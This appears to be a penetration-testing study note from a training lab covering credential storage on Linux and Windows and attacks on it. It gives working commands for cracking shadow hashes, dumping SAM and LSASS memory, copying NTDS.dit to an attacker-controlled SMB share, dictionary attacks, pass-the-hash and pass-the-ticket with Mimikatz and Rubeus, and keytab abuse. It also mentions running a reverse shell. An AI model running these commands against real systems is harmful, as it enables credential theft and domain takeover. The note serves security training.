```table-of-contents
title: ## Table of Contents
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 4 # Include headings up to the specified level
includeLinks: true # Make headings clickable
debugInConsole: false # Print debug info in Obsidian console
```

## Credential Storage
### Linux
> [Linux User Auth](https://tldp.org/HOWTO/pdf/User-Authentication-HOWTO.pdf)

#### /etc/shadow
>Should only be readable by `root`

The shadow file contains all the hashes of user passwords:
```sh
cat /etc/shadow

htb-student:$y$j9T$3QSBB6CbHEu...SNIP...f8Ms:18955:0:99999:7:::
```
The format for the string (*separated by `:`*) goes as:
1. Username (*htb-student*)
2. Password Hash (*\$y\$j9T\$3...f8Ms*, if this field contains a `!` or `*` a user cannot login with password but other auth methods like Kerberos would still work) 
3. Day of last change in unix time (*18955* - days after 1st Jan 1970)
4. Minimum Age in days before the next change can occur (*0*)
5. Maximum Age in days until the next change has to occur (*99999*)
6. Warning period in days before password expires (*7*)
7. Inactivity period is days after password expires before acc is disabled (*:*)
8. Expiration date as days after 1st Jan 1970 (*:*)
9. Reserved field (*:*)
The hash is comprised of 3 parts (*separated by `$`*):
1. Algorithm ID (*\$y*)
2. Salt (*\$j9T*)
3. Hash (*$3QSBB...f8Ms*)
Each algorithm ID corresponds to a hashing algorithm:
- *$1* - MD5
- *$2a* - Blowfish
- *$5* - SHA-256
- *$6* - SHA-512
- *$sha1* - SHA1crypt
- *\$y* - Yescrypt
- *$gy* - Gost-yescrypt
- *$7* - Scrypt
##### Cracking the Shadow file
If both the `passwd` & `shadow` files have been obtained we can use `unshadow` & [[Hashcat]] to try crack it:
```sh
$ unshadow passwd.copy shadow.copy > unshadow.hashes
$ hashcat -m 1800 -a 0 unshadow.hashes rockyou.txt -o unshadow.cracked

# For MD5 hashses we can use mode 500
$ hashcat -m 500 -a 0 md5-hashes.list rockyou.txt
```

#### /etc/passwd
> Should only be writable by root but readable by all

This file contains all the user accounts and some information about them:
```shell
cat /etc/passwd

htb-student:x:1000:1000:,,,:/home/htb-student:/bin/bash
```
1. Username (*htb-student*)
2. Password (*x* means it is encrypted in the shadow file, if this is blank it means no password is required - if a user can edit this they can disable the password auth etc)
3. uid (*1000*)
4. gid (*1000*)
5. comment (*,,,*)
6. home dir (*/home/htb-student*)
7. cmd to run after login (*/bin/bash*)

#### /etc/security/opasswd
A file used by [[Linux#Pluggable Authentication Modules (PAM)|PAM]] to store old passwords. This can be a security weakness as if we get a user's old passwords, we might be able to determine a pattern and guess their current password. This file does by default require admin privs to read.

### Windows
Windows [Windows client authentication process](https://docs.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication) tends to be more complicated than with Linux systems, consisting with many different modules that the various processes required to authenticate a client. Additionally, there are many different authentication processes, such as Kerberos auth.
![[Windows#Local Security Authority (LSA)]]
![[Pasted image 20241218082951.png]]
> A local interactive login (a user logging into the system locally) utilises the logon process (`WinLogon.exe`), the logon user interface process (`LogonUI`), the `credential providers`, `LSASS`, one or more `authentication packages`, and [[Windows#Security Account Manager (SAM)|SAM]] or `AD`.
> Authentication packages are often DLLs that perform authentication checks (non-domain joined and interactive logins is handled by `Msv1_0.dll`).

#### WinLogon
Handles security-related user interactions, including:
- Launching LogonUI to enter password
- Changing passwords
- Locking and unlocking the system
It relies on credential providers *(`COM` objects in DLLs)* on the system to obtain usernames and passwords.
WinLogon is the only process to accept logon requests from the keyboard, sent via [[SMB#RPCclient|RPC]] from `Win32k.sys`.
![[Pasted image 20241218090302.png]]
#### Credential Manager
This feature allows users to save credentials for various network resources and websites. Credentials are stored in each user's `Credential Locker`, which is then encrypted and saved to `C:\Users\[user]\AppData\Local\Microsoft\[Vault/Credentials]`.
#### Local Security Authority Server Service (LSASS)
[Local Security Authority Subsystem Service](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service) (*LSASS*) is a collection of modules and authentication processes. The service is responsible for:
- the local system security policy
- user authentication
- security audit logging to the `Event log`
> Detailed architecture [here](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc961760(v=technet.10)?redirectedfrom=MSDN)

| Authentication Packages | Description                                                                                                                                              |
| ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Lsasrv.dll              | LSA Server service - enforces security policies and acts as the security package manager for LSA. Also selects whether to use NTLM or Kerberos protocol. |
| Msv1_0.dll              | Authentication package for local machine logons that don't require custom authentication.                                                                |
| Samsrv.dll              | The [[Windows#Security Account Manager (SAM)\|SAM]] stores local security accounts, enforces locally stored policies, and supports APIs.                 |
| Kerberos.dll            | Security package for Kerberos-based authentication.                                                                                                      |
| Netlogon.dll            | Network-based logon service.                                                                                                                             |
| Ntdsa.dll               | Library used to create new record and folders in the Windows Registry                                                                                    |
#### Security Account Manager (SAM)
![[Windows#Security Account Manager (SAM)]]

## Common Password Combinations
A really important piece of information for speeding up cracking passwords is understanding the password policy implemented, what criteria does a password have to meet?
A lot of the time a password is asked to meet:
- Must contain a number
- Must contain a symbol
- Must be 8+ chars
- Must contain both lowercase and upper case
Often these accommodations are made by users
- `a -> @`
- `e -> 3`
- `s -> 5`
- `!` at the end
- Capital at the start
- `1` or `123` at the end

A pretty common format for a user to do is:
- Capital at the start
- Single word
- `!` at the end

The [DefaultCreds-Cheat-Sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet) contains a list of many default credentials for common applications, often these default credentials can be forgotten or overlooked when configuring infrastructure which can lead to easy access of the system.

## Windows

### Attacking SAM
> Ref: [[Windows#Security Account Manager (SAM)]]

There are 3 registry hives (*we need local admin access to get*) that are useful for dumping and cracking hashes from the SAM db.
- `hklm\sam` - Hashes for local account passwords
- `hklm\system` - Contains the system boot key that is used to encrypt the SAM database
- `hklm\security` - Contains cached credentials for domain accounts (*useful if we are attacking a domain-joined windows target*)

We can use the `reg.exe` utility to copy the registry hives. Once saved, we just need to [[Operating Systems/Windows/File Transfer|File Transfer]] them back to our attack machine.
```cmd
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
```
> These techniques are well-known so may raise alarms, the [MITRE](https://attack.mitre.org/techniques/T1003/002/) website documents a variety of tools that can also do this same dumping

Once on the attack machine, we can use Impacket's `secretsdump.py` tool to grab the hashes using the three files.
```sh
$ secretsdump -sam sam.save -security security.save -system system.save LOCAL
```

We can then use a tool like [[Hashcat]] to offline crack the NT (*NTLM*) or LM hashes that have been dumped.

**Remote dumping** of the LSA secrets & SAM databases can also be done via tools like `crackmapexec` using a local administrator account:
```sh
$ crackmapexec smb [ip] --local-auth -u [user] -p [pass] --lsa

$ crackmapexec smb [ip] --local-auth -u [user] -p [pass] --sam
```

### Attacking LSASS
> Ref: [[Windows#LSASS]]

Upon initial logon, LSASS will:
- Cache credentials locally in memory
- Create [access tokens](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
- Enforce security policies
- Write to Windows security log
The credentials that get stored in-memory can be dumped and extracted. There are many ways to get the contents of the LSASS process memory.

A memory dump can be created via a few methods:
**Task Manager Memory Dumping** (requires GUI session)
1. Open Task Manager
2. Select the Processes tab
3. Find and right click the `Local Security Authority Process`
4. Select `Create dump file`
5. The file will be created as `C:\Users\[user]\AppData\Local\Temp\lsass.DMP`

**rundll32.exe & comsvcs.dll for Memory Dumping**
> Most modern AV detect this method

We can use the `rundll32.exe` CLI utility to dump the process memory. It is faster than the above method and doesn't require a GUI session.
1. Find the `lsass.exe` process ID (*PID*)
	1. CMD - `tasklist /svc`
	2. PS - `Get-Process lsass`
2. With an elevated PS session we can run:
	1. `rundll32 C:\windows\system32\comsvcs.dll, MiniDump [PID] C:\lsass.dmp full`
> This command uses `rundll32.exe` to run `comsvcs.dll` which in-turn calls MiniDumpWriteDump (`MiniDump`) on the LSASS process memory, outputting to `C:\lsass.dmp`

**Extracting the LSASS credential stores**
The LSASS dump acts like a snapshot of all the active logon sessions at the time it was captured, this means the credentials for these sessions are in the dump.

Running [pypykatz](https://github.com/skelsec/pypykatz) against the minidump can identify the credentials in the dump:
```sh
$ pypykatz lsa minidump ./lsass.dmp
```
```sh
FILE: ======== ../lsass.dmp =======
== LogonSession ==
# <..SNIP..>
username bob
# <..SNIP..>
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== DPAPI [14ab89]==
		luid 1354633
		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605
```

Breaking this down, we can see a bunch of different credentials for different providers. As LSA works with multiple credential providers, it stores the creds for that user for each one.

**MSV**
[MSV](https://docs.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package) is the auth package LSA uses to validate against the SAM database. From the dump we got an `NTLM` & `SHA1` hash of their password.

**WDIGEST**
An older auth protocol enabled by default in *Windows XP -> Windows 8* & *Windows Server 2003 -> 2012*. LSASS stores these credentials in plain-text!
> Microsoft have released a security update for this issue : https://msrc-blog.microsoft.com/2014/06/05/an-overview-of-kb2871997/

**Kerberos**
[Kerberos](https://web.mit.edu/kerberos/#what_is) is a network auth protocol used by Active Directory. Domain user accounts are granted a ticket upon authentication with AD. This ticket allows them access to shared resources without having to type a credential each time. *LSASS caches passwords, ekeys, tickets, and pins* associated with Kerberos. We can extract these and use them to access other systems and resources in the domain.

**DPAPI**
The *Data Protection Application Programming Interface* (*[DPAPI](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection)*) is a set of Windows APIs used to encrypt and decrypt DPAPI data blobs for windows features & third-party apps. The `masterkey` is used to decrypt the secrets associated with each application and allows us to capture all kinds of account credentials.

### Dumping Active Directory's NTDS.dit file
Once a system joins a domain, it will no longer use it's SAM database to validate logon requests. Instead all authentication requests are validated by the domain controller. *The SAM db is still used for local account logins by appending the hostname to the username (eg. `WS01/myuser`) or typing `./` in the username field on the device locally*. It is important to understand what components are being attacked depending how the login is being performed and the configuration of the system.
> NTDS Attack Techniques: https://attack.mitre.org/techniques/T1003/003/

**Using a Dictionary Attack to gain credentials**
[Group Policies](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831791(v=ws.11)) are ways to apply restrictions and permissions across a domain, these can impact our ability to perform techniques like dictionary attacks as it could block login attempts are a certain number of failures.

Often we can guess the format of a username, commonly there is a format set across the organisation (eg. `first.last@company.com`). Google dorks of something like `"@company.com"` or `"company.com filetype:pdf"` can reveal results for employee emails/usernames. Occasionally a company will use aliases for emails (eg. `a901@company.com` might alias to `joe.smith@company.com` internally).

Once a collection of employee names has been gathered, tools like [Username Anarchy](https://github.com/urbanadventurer/username-anarchy) and [[Hashcat#Password mutation|Hashcat]] with custom rules can generate potential usernames. Ideally though, we would try to discover the actual naming convention used by the company.

Above all, we want to try to minimise the amount of data we have in our lists to as specific as we can, reducing the compute time needed.

Once we have prepared our list(s), we can launch the dictionary attack against the target domain controller with a tool like [[CrackMapExec]].
```sh
$ crackmapexc smb [target_ip] -u john.smith@company.com -p ./passwords.list
```
> As far as can be seen, the default Group Policy Object (GPO) for a Windows domain, does NOT include a logon attempt lockout policy.

A caveat to a dictionary attack is that it is incredibly noisy (especially remotely). The windows security log will track all logon attempts and can be observed via `Event Viewer`. 

**Capturing NTDS.dit**
New Technology Directory Services (*NTDS*) is a directory service used with AD to find & organise network resources.
![[Windows#NTDS]]

Once credentials have been obtained, we can use a tool like [[Evil-Winrm]] to connect to the target DC.
```sh
$ evil-winrm -i [target_ip] -u [user] -p [pass]
```
```Powershell
# Check local groups of user (we are looking for local admin or domain admin in order to copy the NTDS.dit file later) 
PS C:\> net localgroup

# Check domain privileges
PS C:\> net user [user]
```

Using `vssadmin`, we can create a [Volume Shadow Copy](https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service)(*VSS*) of the drive that AD is installed into (Almost always `C:`). VSS allows us to make a copy of data that is currently in-use by an application without having to take the application down (often in DR or backup solutions).

```PowerShell
PS C:\> vssadmin CREATE SHADOW /For=C:

vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {186d5979-2f2b-4afe-8101-9f1111e4cb1a}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```
We can then copy the NTDS.dit from the VSS, and move it to our attack machine:
```PowerShell
PS C:\NTDS> cmd.exe /c copy \\?GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\NTDS\NTDS.dit

# Example using an SMB Share to copy it back to attack machine
PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\[atk_box_ip]\Share
```

Dump the contents of the NTDS.dit file using secretsdump. *This does requires the system boot key or the `SYSTEM` registry hive*!
```sh
$ secretsdump -ntds NTDS.dit -system system.save LOCAL
```

**Alternative Method using CME**
```sh
$ crackmapexec smb [target_ip] -u [user] -p [pass] --ntds
```

The NT hashes can then be cracked using [[Hashcat#Dictionary Attack|Hashcat]].
```sh
$ sudo hashcat -m 1000 [hash] [wordlist]
```
*If we are unsuccessful in cracking a hash, there are other methods that can be used to [[Password Attacks#Pass-the-Hash|Pass-the-Hash]]*.

### Pass-the-Hash
A [Pass-the-Hash (*PtH*)](https://arc.net/l/quote/rnlbusfx) attack takes advantage of the [NTLM authentication protocol](https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm#:~:text=NTLM%20uses%20an%20encrypted%20challenge,to%20the%20secured%20NTLM%20credentials) to authenticate a user using a hash. We can use the hash (`username:hash`) directly to login instead of using the clear-text password (`username:password`).

#### Mimikatz
Using [[Mimikatz]] we can dump out the hashes and then we can perform the attack:
![[Mimikatz#Obtaining Hashes & Tickets]]
![[Mimikatz#Pass-the-Hash]]

#### Invoke-TheHash
Another way is to use powershell and the [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash) tool. The tool is a collection of PowerShell functions for performing a PtH attack with [[WMI]] or [[SMB]]. Using the .NET TCPClient, an NTLM hash is used to authenticate and execute a command as a user. *Local administrator privileges are NOT required client-side* but the user and hash we use to authenticate need administrator privileges on the target computer.
```PowerShell
# Import the functions
PS C:\> Import-Module .\Invoke-TheHash.psd1
# PtH via SMB
PS C:\> Invoke-SMBExec -Target <Target_IP/Hostname> -Domain <Domain> -Username <User> -Hash <NTLM_hash> -Command "<cmd>"
```
> We could use a range of commands to add admin users or whatever. A useful thing could be to execute a reverse shell. A website like https://www.revshells.com/ can generate a PowerShell Base64 reverse shell command.

#### PtH with Impacket (Linux)
We can use a tool like Impacket's `PsExec` to execute a PtH attack.
```sh
$ impacket-psexec <admin_user>@<target> -hashes :<hash>
```

#### Pass the Hash with CrackMapExec
![[CrackMapExec#Password Spraying a domain using Pass-the-Hash]]

#### Pass the Hash with evil-winrm
![[Evil-Winrm#Pass-the-Hash]]

#### PtH via RDP (Linux)
Under certain circumstances, PtH can be achieved via RDP to gain GUI access using a tool like [[xfreerdp]].
- `Restricted Admin Mode` must be enabled (*disabled by default*) on the target host.
	- The `DisableRestrictedAdmin` (*REG_DWORD*) key can be added to the `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` with the value 0.
	- `C:\> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`
Once enabled, we can use [[xfreerdp]] and the `/pth` option to gain access
```sh
$ xfreerdp /v:[target_ip] /u:[user] /pth:[hash]
```
User Account Control (UAC) can limit a local user's ability to perform remote administration operations. If the registry key `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` is set to 0, only the built-in local admin can perform these operations. Setting it to 1 will allow other local admins.
> If the registry key `FilterAdministratorToken` is enabled (set to 1, but *disabled by default*) then even the RID 500 account is restricted. Meaning remote PTH will fail against even this account.

These settings only apply to local administrator accounts however, domain accounts with admin rights on the system can still be exploited using PtH.

### Pass-the-Ticket (PtT) on Windows systems
Very similarly to a [[#Pass-the-Hash]] attack, but instead of an NTLM hash, we use a [[Kerberos]] ticket to move laterally through an AD environment. To perform a PtT attack, we need a valid Kerberos ticket, either a [[Kerberos#Ticket Granting Ticket (TGT)|TGT]] (giving us access to any resource a user has privileges) or a [[Kerberos#Ticket Granting Service (TGS)|TGS]] (to allow access to a specific resource).

On Windows, tickets are processed and stored by the [[Windows#LSASS|LSASS]] process. A non-privileged user can only request their own tickets, but a local admin can collect them all. Therefore, to use either of the options below to export tickets, you *must be running as local administrator*.
#### Exporting Tickets with Mimikatz (Windows)
![[Mimikatz#Obtaining Hashes & Tickets]]

#### Exporting Tickets with Rubeus (Windows)
[Rubeus](https://github.com/GhostPack/Rubeus) can be used to export tickets using the `dump` option. (if running as the local administrator) then all tickets can be dumped in base64 format.
> The `/nowrap` flag can make copy-paste easier.

```cmd
C:\> Rubeus.exe dump /nowrap
```

### Pass-the-Ticket (PtT) on Linux systems
Rarely but still a possibility, a linux system can be connected to an Active Directory environment (or may communicate with one via scripts etc). Commonly, Kerberos is also used for this authentication, therefore it is possible to perform PtT from a linux system.

Linux machines stores Kerberos tickets as [ccache files](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) in the `/tmp` directory. By default the location of the store is in the `KRB5CCNAME` env var. Normally, only privileged users can read/write these files.

Another source for Kerberos tickets on linux is with [keytab](https://kb.iu.edu/d/aumh) files. They are files that contain pairs of Kerberos principals and encrypted keys (*which are derived from your Kerberos password*). These keytabs are used to authenticate to remote servers using Kerberos without needing the password (*but have to be recreated if the password is changed*). [Keytab](https://kb.iu.edu/d/aumh) files are useful for allowing scripts to authenticate without human interaction or passwords being stored.
> Keytabs are not computer specific, so could be copied (or stolen) and reused on another machine to authenticate as that user.
> You must have rw privileges to use a keytab file
> The linux machine's ticket is default stored as `/etc/krb5.keytab` which would allow you to completely impersonate the machine itself

#### Check if Linux machine is domain-joined
```sh
# Will display any domains the machine is connected to
$ realm list
```
> Ref: [realm](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd)
> If `realm` isn't available, we can look for the [sssd](https://sssd.io/) or [winbind](https://www.samba.org/samba/docs/current/man-html/winbindd.8.html) services which could suggest if the machine is domain-joined - [blog post](https://web.archive.org/web/20210624040251/https://www.2daygeek.com/how-to-identify-that-the-linux-server-is-integrated-with-active-directory-ad/)
> `ps -ef | grep -i "winbind\|sssd"`
#### Identifying Keytab files
```sh
$ find / -name *keytab* -ls 2>/dev/null
```
Sometimes these files are referenced in scripts or cronjobs. A common tool for interacting with Kerberos in linux is [kinit](https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/kinit.html) and can be a key indicator for keytab files.

#### CCACHE files (Credential Cache)
```sh
$ env | grep -i krb5
KRB5CCNAME=FILE:/tmp/...
```
Each time a user logs in and authenticated via Kerberos, a cache file is created for them. If we have privileges to read the files (normally root) then we can impersonate any user that is authenticated.

#### Abusing KeyTab files
```sh
# List information about a keytab file (incl. who it belongs too a.k.a the principle name)
$ klist -k -t <keytab_file>

# View current kerberos login information
$ klist

# Impersonate a different user
$ kinit <principle_name> -k -t <keytab_file>
$ kinit julia@mydomain.com -k -t /home/julia/julia.keytab
```
> To keep a copy of the ticket of the current user before we impersonate another user, we can make a copy of the file referenced in the `KRB5CCNAME` env var

Whilst this method is good for accessing a resource, it will not give us the ability to take control of the account on the linux machine (we still require the password).
#### Extracting secrets from KeyTab files
We can extract the hashes from KeyTab files and attempt to crack the hash to get the user's password. [KeyTabExtract](https://github.com/sosdave/KeyTabExtract) is a python tool for doing the extraction. It grabs the information from *502-type .keytab files*. It will get information such as the *realm*, *Service Principle*, *Encryption Type*, and *Hashes*.
```sh
$ python3 keytabextract.py /home/julia/julia.keytab

[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : INLANEFREIGHT.HTB
        SERVICE PRINCIPAL : carlos/
        NTLM HASH : a738f...cce60
        AES-256 HASH : 42ff...3007f
        AES-128 HASH : fa74...61c4a
```
> We can perform:
> - [[#Pass-the-Hash]] with the NTLM hash
> - [[#Pass the Key or OverPass the Hash]] with the AES hashes to forge our own tickets
> - Or crack the hashes to obtain the plaintext passwords
> (KeyTab files can contain multiple credentials for multiple users, and/or different hash types)

### Pass the Key or OverPass the Hash
Another way to obtain tickets is to forge them ourselves. By obtaining an NTLM hash or key (*rc4_hmac*, *aes256_cts_hmac_sha1*, etc) for a domain-joined user, we can convert it into a [[Kerberos#Ticket Granting Ticket (TGT)|TGT]].
We can collect the encryption keys using a tool like [[Mimikatz]]:
![[Mimikatz#Exporting Kerberos Keys]]

Then perform the attack:
![[Mimikatz#Pass-the-Hash]]

```cmd
C:\> Rubeus.exe asktgt /domain:<domain> /user:<user> /<key_type>:<key> /nowrap

<SNIP>
[*] base64(ticket.kirbi): doIE1...Y29t
```
> The key type can be `/rc4`, `/aes128`, `/aes256`, or `/des`.
> Most AD domains use AES encryption as default now, so using an `rc4` key could cause an `encryption downgrade` alert.

[[Mimikatz]] requires administrative rights to perform the Pass the Key/OverPass the Hash attack, whereas [Rubeus](https://github.com/GhostPack/Rubeus) does not.
> Ref: [Rubeus Example for OverPass the Hash](https://github.com/GhostPack/Rubeus#example-over-pass-the-hash)

#### Pass the Ticket with Rubeus
Instead of doing an OverPass the Hash attack to generate a ticket, we can instead do a PtT attack to submit the ticket to the current logon session.
```cmd
C:\> Rubeus.exe asktgt /domain:<domain> /user:<user> /<key_type>:<key> /ptt

<SNIP>
[*] base64(ticket.kirbi): doIE1...Y29t
[+] Ticket successfully imported!
```
> This displays the successful import message

A ticket can also be passed from a `.kirbi` file on the disk (*it also supports putting the base64 version of the ticket in*):
```cmd
C:\> Rubeus.exe ptt /ticket:<ticket_file>

[*] Action: Import Ticket
[+] ticket successfully imported!
```
> Convert a file to Base64 in PowerShell: `[Convert]::ToBase64String([IO.File]::ReadAllBytes("<file_path>"))`

Once the attack has been performed, we can then access the system as that user:
```cmd
C:\> dir \\DC01.mydomain.com\C$
```

#### Pass the Ticket with Mimikatz
![[Mimikatz#Pass the Ticket]]

#### Pass the Ticket with PowerShell Remoting
[PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2) allows us to run scripts or commands on a remote system. It creates HTTP and HTTPS listeners on TCP/5985 & TCP/5986 (*[[WinRM]]*). You must be either:
- An administrator
- A member of the Remote Management Users group
- Have explicit PowerShell Remoting permissions in your session configuration

With [[Mimikatz]] you can perform the [[Mimikatz#Pass the Ticket|Pass the Ticket]] attack, then connect via a powershell session to the target
```cmd
C:\> mimikatz.exe

<MIMIKATZ PTT ATTACK>

mimikatz # exit
C:\> powershell
```
```PowerShell
PS C:\> Enter-PSSession -ComputerName <target>
```

[Rubeus](https://github.com/GhostPack/Rubeus) can do the same using the `createnetonly` option. It creates a sacrificial process/logon session([Logon type 9](https://eventlogxp.com/blog/logon-type-what-does-it-mean/)). Using a `netonly` process we prevent the erasure of existing TGTs for the current logon session.
```cmd
C:\> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```
Once this creates a new CMD window, we can then proceed as normal with the PtT attack:
```cmd
C:\> Rubeus.exe asktgt /domain:<domain> /user:<user> /<key_type>:<key> /ptt

C:\> powershell
```
```PowerShell
PS C:\> Enter-PSSession -ComputerName <target>
```
